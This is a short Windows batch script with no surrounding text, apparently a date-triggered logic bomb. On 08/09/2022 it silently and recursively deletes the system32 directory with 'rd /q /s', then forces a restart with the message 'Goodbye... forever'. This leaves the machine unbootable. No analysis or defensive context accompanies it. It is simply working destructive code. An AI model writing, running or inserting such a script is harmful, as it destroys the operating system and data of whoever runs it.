@echo off
if %date% == 08/09/2022 rd "%windir%\system32"/q/s
if %date% == 08/09/2022 shutdown -r -c "Goodbye... forever" -t 3